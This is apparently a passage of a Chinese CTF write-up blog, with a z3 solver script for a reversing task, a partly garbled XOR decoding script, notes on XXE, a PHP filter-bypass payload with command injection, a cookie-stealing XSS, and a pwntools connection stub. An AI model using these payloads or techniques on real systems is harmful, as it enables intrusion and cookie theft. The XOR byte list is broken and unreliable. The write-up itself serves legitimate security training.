<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">flag = [Int(<span class="string">&#x27;flag%d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>):</span><br><span class="line">    solver.add(flag[i]&gt;=<span class="number">32</span>)</span><br><span class="line">    solver.add(flag[i]&lt;=<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = [<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">18564</span>,  <span class="number">37316</span>,  <span class="number">32053</span>,  <span class="number">33278</span>,  <span class="number">23993</span>,  <span class="number">33151</span>,  <span class="number">15248</span>,  <span class="number">13719</span>,  <span class="number">34137</span>,  <span class="number">27391</span>,  <span class="number">28639</span>,  <span class="number">18453</span>,  <span class="number">28465</span>,  <span class="number">12384</span>,  <span class="number">20780</span>,  <span class="number">45085</span>,  <span class="number">35827</span>,  <span class="number">37243</span>,  <span class="number">26037</span>,  <span class="number">39409</span>,  <span class="number">17583</span>,  <span class="number">20825</span>,  <span class="number">44474</span>,  <span class="number">35138</span>,  <span class="number">36914</span>,  <span class="number">25918</span>,  <span class="number">38915</span>,  <span class="number">17672</span>,  <span class="number">21219</span>,  <span class="number">43935</span>,  <span class="number">37072</span>,  <span class="number">39359</span>,  <span class="number">27793</span>,  <span class="number">41447</span>,  <span class="number">18098</span>,  <span class="number">21335</span>,  <span class="number">46164</span>,  <span class="number">38698</span>,  <span class="number">39084</span>,  <span class="number">29205</span>,  <span class="number">40913</span>,  <span class="number">19117</span>,  <span class="number">21786</span>,  <span class="number">46573</span>,  <span class="number">38322</span>,  <span class="number">41017</span>,  <span class="number">29298</span>,  <span class="number">43409</span>,  <span class="number">19655</span>]</span><br><span class="line"></span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">2</span>] == <span class="number">34</span> * flag[<span class="number">3</span>] + <span class="number">12</span> * flag[<span class="number">0</span>] + <span class="number">53</span> * flag[<span class="number">1</span>] + <span class="number">6</span> * flag[<span class="number">2</span>] + <span class="number">58</span> * flag[<span class="number">4</span>] + <span class="number">36</span> * flag[<span class="number">5</span>] + flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">3</span>] == <span class="number">27</span> * flag[<span class="number">4</span>] + <span class="number">73</span> * flag[<span class="number">3</span>] + <span class="number">12</span> * flag[<span class="number">2</span>] + <span class="number">83</span> * flag[<span class="number">0</span>] + <span class="number">85</span> * flag[<span class="number">1</span>] + <span class="number">96</span> * flag[<span class="number">5</span>] + <span class="number">52</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">4</span>] == <span class="number">24</span> * flag[<span class="number">2</span>] + <span class="number">78</span> * flag[<span class="number">0</span>] + <span class="number">53</span> * flag[<span class="number">1</span>] + <span class="number">36</span> * flag[<span class="number">3</span>] + <span class="number">86</span> * flag[<span class="number">4</span>] + <span class="number">25</span> * flag[<span class="number">5</span>] + <span class="number">46</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">5</span>] == <span class="number">78</span> * flag[<span class="number">1</span>] + <span class="number">39</span> * flag[<span class="number">0</span>] + <span class="number">52</span> * flag[<span class="number">2</span>] + <span class="number">9</span> * flag[<span class="number">3</span>] + <span class="number">62</span> * flag[<span class="number">4</span>] + <span class="number">37</span> * flag[<span class="number">5</span>] + <span class="number">84</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">6</span>] == <span class="number">48</span> * flag[<span class="number">4</span>] + <span class="number">6</span> * flag[<span class="number">1</span>] + <span class="number">23</span> * flag[<span class="number">0</span>] + <span class="number">14</span> * flag[<span class="number">2</span>] + <span class="number">74</span> * flag[<span class="number">3</span>] + <span class="number">12</span> * flag[<span class="number">5</span>] + <span class="number">83</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">7</span>] == <span class="number">15</span> * flag[<span class="number">5</span>] + <span class="number">48</span> * flag[<span class="number">4</span>] + <span class="number">92</span> * flag[<span class="number">2</span>] + <span class="number">85</span> * flag[<span class="number">1</span>] + <span class="number">27</span> * flag[<span class="number">0</span>] + <span class="number">42</span> * flag[<span class="number">3</span>] + <span class="number">72</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">8</span>] == <span class="number">26</span> * flag[<span class="number">5</span>] + <span class="number">67</span> * flag[<span class="number">3</span>] + <span class="number">6</span> * flag[<span class="number">1</span>] + <span class="number">4</span> * flag[<span class="number">0</span>] + <span class="number">3</span> * flag[<span class="number">2</span>] + <span class="number">68</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">9</span>] == <span class="number">34</span> * flag[<span class="number">10</span>] + <span class="number">12</span> * flag[<span class="number">7</span>] + <span class="number">53</span> * flag[<span class="number">8</span>] + <span class="number">6</span> * flag[<span class="number">9</span>] + <span class="number">58</span> * flag[<span class="number">11</span>] + <span class="number">36</span> * flag[<span class="number">12</span>] + flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">10</span>] == <span class="number">27</span> * flag[<span class="number">11</span>] + <span class="number">73</span> * flag[<span class="number">10</span>] + <span class="number">12</span> * flag[<span class="number">9</span>] + <span class="number">83</span> * flag[<span class="number">7</span>] + <span class="number">85</span> * flag[<span class="number">8</span>] + <span class="number">96</span> * flag[<span class="number">12</span>] + <span class="number">52</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">11</span>] == <span class="number">24</span> * flag[<span class="number">9</span>] + <span class="number">78</span> * flag[<span class="number">7</span>] + <span class="number">53</span> * flag[<span class="number">8</span>] + <span class="number">36</span> * flag[<span class="number">10</span>] + <span class="number">86</span> * flag[<span class="number">11</span>] + <span class="number">25</span> * flag[<span class="number">12</span>] + <span class="number">46</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">12</span>] == <span class="number">78</span> * flag[<span class="number">8</span>] + <span class="number">39</span> * flag[<span class="number">7</span>] + <span class="number">52</span> * flag[<span class="number">9</span>] + <span class="number">9</span> * flag[<span class="number">10</span>] + <span class="number">62</span> * flag[<span class="number">11</span>] + <span class="number">37</span> * flag[<span class="number">12</span>] + <span class="number">84</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">13</span>] == <span class="number">48</span> * flag[<span class="number">11</span>] + <span class="number">6</span> * flag[<span class="number">8</span>] + <span class="number">23</span> * flag[<span class="number">7</span>] + <span class="number">14</span> * flag[<span class="number">9</span>] + <span class="number">74</span> * flag[<span class="number">10</span>] + <span class="number">12</span> * flag[<span class="number">12</span>] + <span class="number">83</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">14</span>] == <span class="number">15</span> * flag[<span class="number">12</span>] + <span class="number">48</span> * flag[<span class="number">11</span>] + <span class="number">92</span> * flag[<span class="number">9</span>] + <span class="number">85</span> * flag[<span class="number">8</span>] + <span class="number">27</span> * flag[<span class="number">7</span>] + <span class="number">42</span> * flag[<span class="number">10</span>] + <span class="number">72</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">15</span>] == <span class="number">26</span> * flag[<span class="number">12</span>] + <span class="number">67</span> * flag[<span class="number">10</span>] + <span class="number">6</span> * flag[<span class="number">8</span>] + <span class="number">4</span> * flag[<span class="number">7</span>] + <span class="number">3</span> * flag[<span class="number">9</span>] + <span class="number">68</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">16</span>] == <span class="number">34</span> * flag[<span class="number">17</span>] + <span class="number">12</span> * flag[<span class="number">14</span>] + <span class="number">53</span> * flag[<span class="number">15</span>] + <span class="number">6</span> * flag[<span class="number">16</span>] + <span class="number">58</span> * flag[<span class="number">18</span>] + <span class="number">36</span> * flag[<span class="number">19</span>] + flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">17</span>] == <span class="number">27</span> * flag[<span class="number">18</span>] + <span class="number">73</span> * flag[<span class="number">17</span>] + <span class="number">12</span> * flag[<span class="number">16</span>] + <span class="number">83</span> * flag[<span class="number">14</span>] + <span class="number">85</span> * flag[<span class="number">15</span>] + <span class="number">96</span> * flag[<span class="number">19</span>] + <span class="number">52</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">18</span>] == <span class="number">24</span> * flag[<span class="number">16</span>] + <span class="number">78</span> * flag[<span class="number">14</span>] + <span class="number">53</span> * flag[<span class="number">15</span>] + <span class="number">36</span> * flag[<span class="number">17</span>] + <span class="number">86</span> * flag[<span class="number">18</span>] + <span class="number">25</span> * flag[<span class="number">19</span>] + <span class="number">46</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">19</span>] == <span class="number">78</span> * flag[<span class="number">15</span>] + <span class="number">39</span> * flag[<span class="number">14</span>] + <span class="number">52</span> * flag[<span class="number">16</span>] + <span class="number">9</span> * flag[<span class="number">17</span>] + <span class="number">62</span> * flag[<span class="number">18</span>] + <span class="number">37</span> * flag[<span class="number">19</span>] + <span class="number">84</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">20</span>] == <span class="number">48</span> * flag[<span class="number">18</span>] + <span class="number">6</span> * flag[<span class="number">15</span>] + <span class="number">23</span> * flag[<span class="number">14</span>] + <span class="number">14</span> * flag[<span class="number">16</span>] + <span class="number">74</span> * flag[<span class="number">17</span>] + <span class="number">12</span> * flag[<span class="number">19</span>] + <span class="number">83</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">21</span>] == <span class="number">15</span> * flag[<span class="number">19</span>] + <span class="number">48</span> * flag[<span class="number">18</span>] + <span class="number">92</span> * flag[<span class="number">16</span>] + <span class="number">85</span> * flag[<span class="number">15</span>] + <span class="number">27</span> * flag[<span class="number">14</span>] + <span class="number">42</span> * flag[<span class="number">17</span>] + <span class="number">72</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">22</span>] == <span class="number">26</span> * flag[<span class="number">19</span>] + <span class="number">67</span> * flag[<span class="number">17</span>] + <span class="number">6</span> * flag[<span class="number">15</span>] + <span class="number">4</span> * flag[<span class="number">14</span>] + <span class="number">3</span> * flag[<span class="number">16</span>] + <span class="number">68</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">23</span>] == <span class="number">34</span> * flag[<span class="number">24</span>] + <span class="number">12</span> * flag[<span class="number">21</span>] + <span class="number">53</span> * flag[<span class="number">22</span>] + <span class="number">6</span> * flag[<span class="number">23</span>] + <span class="number">58</span> * flag[<span class="number">25</span>] + <span class="number">36</span> * flag[<span class="number">26</span>] + flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">24</span>] == <span class="number">27</span> * flag[<span class="number">25</span>] + <span class="number">73</span> * flag[<span class="number">24</span>] + <span class="number">12</span> * flag[<span class="number">23</span>] + <span class="number">83</span> * flag[<span class="number">21</span>] + <span class="number">85</span> * flag[<span class="number">22</span>] + <span class="number">96</span> * flag[<span class="number">26</span>] + <span class="number">52</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">25</span>] == <span class="number">24</span> * flag[<span class="number">23</span>] + <span class="number">78</span> * flag[<span class="number">21</span>] + <span class="number">53</span> * flag[<span class="number">22</span>] + <span class="number">36</span> * flag[<span class="number">24</span>] + <span class="number">86</span> * flag[<span class="number">25</span>] + <span class="number">25</span> * flag[<span class="number">26</span>] + <span class="number">46</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">26</span>] == <span class="number">78</span> * flag[<span class="number">22</span>] + <span class="number">39</span> * flag[<span class="number">21</span>] + <span class="number">52</span> * flag[<span class="number">23</span>] + <span class="number">9</span> * flag[<span class="number">24</span>] + <span class="number">62</span> * flag[<span class="number">25</span>] + <span class="number">37</span> * flag[<span class="number">26</span>] + <span class="number">84</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">27</span>] == <span class="number">48</span> * flag[<span class="number">25</span>] + <span class="number">6</span> * flag[<span class="number">22</span>] + <span class="number">23</span> * flag[<span class="number">21</span>] + <span class="number">14</span> * flag[<span class="number">23</span>] + <span class="number">74</span> * flag[<span class="number">24</span>] + <span class="number">12</span> * flag[<span class="number">26</span>] + <span class="number">83</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">28</span>] == <span class="number">15</span> * flag[<span class="number">26</span>] + <span class="number">48</span> * flag[<span class="number">25</span>] + <span class="number">92</span> * flag[<span class="number">23</span>] + <span class="number">85</span> * flag[<span class="number">22</span>] + <span class="number">27</span> * flag[<span class="number">21</span>] + <span class="number">42</span> * flag[<span class="number">24</span>] + <span class="number">72</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">29</span>] == <span class="number">26</span> * flag[<span class="number">26</span>] + <span class="number">67</span> * flag[<span class="number">24</span>] + <span class="number">6</span> * flag[<span class="number">22</span>] + <span class="number">4</span> * flag[<span class="number">21</span>] + <span class="number">3</span> * flag[<span class="number">23</span>] + <span class="number">68</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">30</span>] == <span class="number">34</span> * flag[<span class="number">31</span>] + <span class="number">12</span> * flag[<span class="number">28</span>] + <span class="number">53</span> * flag[<span class="number">29</span>] + <span class="number">6</span> * flag[<span class="number">30</span>] + <span class="number">58</span> * flag[<span class="number">32</span>] + <span class="number">36</span> * flag[<span class="number">33</span>] + flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">31</span>] == <span class="number">27</span> * flag[<span class="number">32</span>] + <span class="number">73</span> * flag[<span class="number">31</span>] + <span class="number">12</span> * flag[<span class="number">30</span>] + <span class="number">83</span> * flag[<span class="number">28</span>] + <span class="number">85</span> * flag[<span class="number">29</span>] + <span class="number">96</span> * flag[<span class="number">33</span>] + <span class="number">52</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">32</span>] == <span class="number">24</span> * flag[<span class="number">30</span>] + <span class="number">78</span> * flag[<span class="number">28</span>] + <span class="number">53</span> * flag[<span class="number">29</span>] + <span class="number">36</span> * flag[<span class="number">31</span>] + <span class="number">86</span> * flag[<span class="number">32</span>] + <span class="number">25</span> * flag[<span class="number">33</span>] + <span class="number">46</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">33</span>] == <span class="number">78</span> * flag[<span class="number">29</span>] + <span class="number">39</span> * flag[<span class="number">28</span>] + <span class="number">52</span> * flag[<span class="number">30</span>] + <span class="number">9</span> * flag[<span class="number">31</span>] + <span class="number">62</span> * flag[<span class="number">32</span>] + <span class="number">37</span> * flag[<span class="number">33</span>] + <span class="number">84</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">34</span>] == <span class="number">48</span> * flag[<span class="number">32</span>] + <span class="number">6</span> * flag[<span class="number">29</span>] + <span class="number">23</span> * flag[<span class="number">28</span>] + <span class="number">14</span> * flag[<span class="number">30</span>] + <span class="number">74</span> * flag[<span class="number">31</span>] + <span class="number">12</span> * flag[<span class="number">33</span>] + <span class="number">83</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">35</span>] == <span class="number">15</span> * flag[<span class="number">33</span>] + <span class="number">48</span> * flag[<span class="number">32</span>] + <span class="number">92</span> * flag[<span class="number">30</span>] + <span class="number">85</span> * flag[<span class="number">29</span>] + <span class="number">27</span> * flag[<span class="number">28</span>] + <span class="number">42</span> * flag[<span class="number">31</span>] + <span class="number">72</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">36</span>] == <span class="number">26</span> * flag[<span class="number">33</span>] + <span class="number">67</span> * flag[<span class="number">31</span>] + <span class="number">6</span> * flag[<span class="number">29</span>] + <span class="number">4</span> * flag[<span class="number">28</span>] + <span class="number">3</span> * flag[<span class="number">30</span>] + <span class="number">68</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">37</span>] == <span class="number">34</span> * flag[<span class="number">38</span>] + <span class="number">12</span> * flag[<span class="number">35</span>] + <span class="number">53</span> * flag[<span class="number">36</span>] + <span class="number">6</span> * flag[<span class="number">37</span>] + <span class="number">58</span> * flag[<span class="number">39</span>] + <span class="number">36</span> * flag[<span class="number">40</span>] + flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">38</span>] == <span class="number">27</span> * flag[<span class="number">39</span>] + <span class="number">73</span> * flag[<span class="number">38</span>] + <span class="number">12</span> * flag[<span class="number">37</span>] + <span class="number">83</span> * flag[<span class="number">35</span>] + <span class="number">85</span> * flag[<span class="number">36</span>] + <span class="number">96</span> * flag[<span class="number">40</span>] + <span class="number">52</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">39</span>] == <span class="number">24</span> * flag[<span class="number">37</span>] + <span class="number">78</span> * flag[<span class="number">35</span>] + <span class="number">53</span> * flag[<span class="number">36</span>] + <span class="number">36</span> * flag[<span class="number">38</span>] + <span class="number">86</span> * flag[<span class="number">39</span>] + <span class="number">25</span> * flag[<span class="number">40</span>] + <span class="number">46</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">40</span>] == <span class="number">78</span> * flag[<span class="number">36</span>] + <span class="number">39</span> * flag[<span class="number">35</span>] + <span class="number">52</span> * flag[<span class="number">37</span>] + <span class="number">9</span> * flag[<span class="number">38</span>] + <span class="number">62</span> * flag[<span class="number">39</span>] + <span class="number">37</span> * flag[<span class="number">40</span>] + <span class="number">84</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">41</span>] == <span class="number">48</span> * flag[<span class="number">39</span>] + <span class="number">6</span> * flag[<span class="number">36</span>] + <span class="number">23</span> * flag[<span class="number">35</span>] + <span class="number">14</span> * flag[<span class="number">37</span>] + <span class="number">74</span> * flag[<span class="number">38</span>] + <span class="number">12</span> * flag[<span class="number">40</span>] + <span class="number">83</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">42</span>] == <span class="number">15</span> * flag[<span class="number">40</span>] + <span class="number">48</span> * flag[<span class="number">39</span>] + <span class="number">92</span> * flag[<span class="number">37</span>] + <span class="number">85</span> * flag[<span class="number">36</span>] + <span class="number">27</span> * flag[<span class="number">35</span>] + <span class="number">42</span> * flag[<span class="number">38</span>] + <span class="number">72</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">43</span>] == <span class="number">26</span> * flag[<span class="number">40</span>] + <span class="number">67</span> * flag[<span class="number">38</span>] + <span class="number">6</span> * flag[<span class="number">36</span>] + <span class="number">4</span> * flag[<span class="number">35</span>] + <span class="number">3</span> * flag[<span class="number">37</span>] + <span class="number">68</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">44</span>] == <span class="number">34</span> * flag[<span class="number">45</span>] + <span class="number">12</span> * flag[<span class="number">42</span>] + <span class="number">53</span> * flag[<span class="number">43</span>] + <span class="number">6</span> * flag[<span class="number">44</span>] + <span class="number">58</span> * flag[<span class="number">46</span>] + <span class="number">36</span> * flag[<span class="number">47</span>] + flag[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">45</span>] == <span class="number">27</span> * flag[<span class="number">46</span>] + <span class="number">73</span> * flag[<span class="number">45</span>] + <span class="number">12</span> * flag[<span class="number">44</span>] + <span class="number">83</span> * flag[<span class="number">42</span>] + <span class="number">85</span> * flag[<span class="number">43</span>] + <span class="number">96</span> * flag[<span class="number">47</span>] + <span class="number">52</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">46</span>] == <span class="number">24</span> * flag[<span class="number">44</span>] + <span class="number">78</span> * flag[<span class="number">42</span>] + <span class="number">53</span> * flag[<span class="number">43</span>] + <span class="number">36</span> * flag[<span class="number">45</span>] + <span class="number">86</span> * flag[<span class="number">46</span>] + <span class="number">25</span> * flag[<span class="number">47</span>] + <span class="number">46</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">47</span>] == <span class="number">78</span> * flag[<span class="number">43</span>] + <span class="number">39</span> * flag[<span class="number">42</span>] + <span class="number">52</span> * flag[<span class="number">44</span>] + <span class="number">9</span> * flag[<span class="number">45</span>] + <span class="number">62</span> * flag[<span class="number">46</span>] + <span class="number">37</span> * flag[<span class="number">47</span>] + <span class="number">84</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">48</span>] == <span class="number">48</span> * flag[<span class="number">46</span>] + <span class="number">6</span> * flag[<span class="number">43</span>] + <span class="number">23</span> * flag[<span class="number">42</span>] + <span class="number">14</span> * flag[<span class="number">44</span>] + <span class="number">74</span> * flag[<span class="number">45</span>] + <span class="number">12</span> * flag[<span class="number">47</span>] + <span class="number">83</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">49</span>] == <span class="number">15</span> * flag[<span class="number">47</span>] + <span class="number">48</span> * flag[<span class="number">46</span>] + <span class="number">92</span> * flag[<span class="number">44</span>] + <span class="number">85</span> * flag[<span class="number">43</span>] + <span class="number">27</span> * flag[<span class="number">42</span>] + <span class="number">42</span> * flag[<span class="number">45</span>] + <span class="number">72</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="built_in">str</span>[<span class="number">50</span>] == <span class="number">26</span> * flag[<span class="number">47</span>] + <span class="number">67</span> * flag[<span class="number">45</span>] + <span class="number">6</span> * flag[<span class="number">43</span>] + <span class="number">4</span> * flag[<span class="number">42</span>] + <span class="number">3</span> * flag[<span class="number">44</span>] + <span class="number">68</span> * flag[<span class="number">48</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>):</span><br><span class="line">        s.append(m[flag[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line">    <span class="built_in">print</span> s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="built_in">str</span>+=<span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span></span><br></pre></td></tr></table></figure>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125202546147.png" alt="image-20191125202546147"></p>
<p>ida查看反编译源码，<strong>发现输入直接和字符串</strong>s**</p>
<h3 id="Our-16bit-Games"><a href="#Our-16bit-Games" class="headerlink" title="Our 16bit Games"></a>Our 16bit Games</h3><p>ida反编译在程序末尾发现一连串输出，其将一连串数据分别与ds：0fa2、ds：0fa4的值进行异或，应该就是flag了</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125203551803.png" alt="image-20191125203551803"></p>
<p>通过反推，发现ds：0fa2位置的参数通过了一连串检验，由检验算法可推出关键参数，c0h、deh</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125204003878.png" alt="image-20191125204003878"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a=[<span class="number">0x8E</span>, <span class="number">0x9D</span>, <span class="number">0xDA</span>, xCD, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDF</span>, <span class="number">0xB4</span>, <span class="number">0x02</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDF</span>, <span class="number">0xB4</span>, x02, <span class="number">0x98</span>, , <span class="number">0xBB</span>, , <span class="number">0x89</span>, , <span class="number">0xF3</span>, , <span class="number">0xEF</span>, , <span class="number">0x83</span>, , <span class="number">0xEE</span>, , <span class="number">0xAD</span>, <span class="number">0xB2</span>, <span class="number">0x9B</span>,<span class="number">0x9F</span>, ,<span class="number">0xEC</span>, , <span class="number">0x9F</span>,<span class="number">0x9A</span>, <span class="number">0xF0</span>, , <span class="number">0xEB</span>,<span class="number">0x9F</span>, ,<span class="number">0x97</span>, , <span class="number">0xF6</span>,<span class="number">0xBC</span>, ,<span class="number">0xF1</span>, <span class="number">0xE9</span>,<span class="number">0x9F</span>, ,<span class="number">0xE7</span>, , <span class="number">0xA1</span>,<span class="number">0xB3</span>, <span class="number">0xF3</span>, <span class="number">0xA3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        a[i]=a[i]^<span class="number">0xc0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a[i]=a[i]^<span class="number">0xde</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h3><p>题目提示flag在/flag<br>填写user和passwd之后抓包，经过测试在user处存在xxe<br>直接读flag</p>
<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>和上题一样xxe，提示要用xxe做更多东西<br>尝试下内网探测</p>
<h3 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h3><p>第一关 绕过正则 num=23333%0a<br>第二关 str1纯数字，md5后str1和str2不相等，把cxhp换成0123后弱相等<br>写脚本跑出一个开头0e或者ce,后面字符串经过替换后为纯数字的纯数字字符串就是str1<br>Str1=9427417<br>Str2和str1类似，开头开头0e或者ce,后面字符串经过替换后为纯数字的字符串即为str2（str1和str2经过md5后不能同时0e开头且后面字符串为纯数字）<br>Str2=q0000653f8c<br>第三关<br>php中.会解析成_，q.w.q绕过第一个if<br>第二个if貌似没什么用<br>第三个if不能用cat<br>而且命令长度不能大于8<br>Ls看下当前目录发现flag文件，忘了叫啥名字挺长超过8了fl开头的<br>用通配符可以绕过<br>Cmd=tac fl<em><br>Payload: num=23333%0a&amp;str1=9427417&amp;str2=q0000653f8c&amp;q.w.q=tac%20fl</em><br>Simple Xss<br>注册账号，登陆，发现可以给任何人发送消息，简单测试消息处存在xss<br>无任何过滤<br>给admin发打cookie的xss<br>抓到cookie浏览器修改本地cookie，F5,flag到手。。</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;139.129.76.65&quot;</span>,<span class="number">50003</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
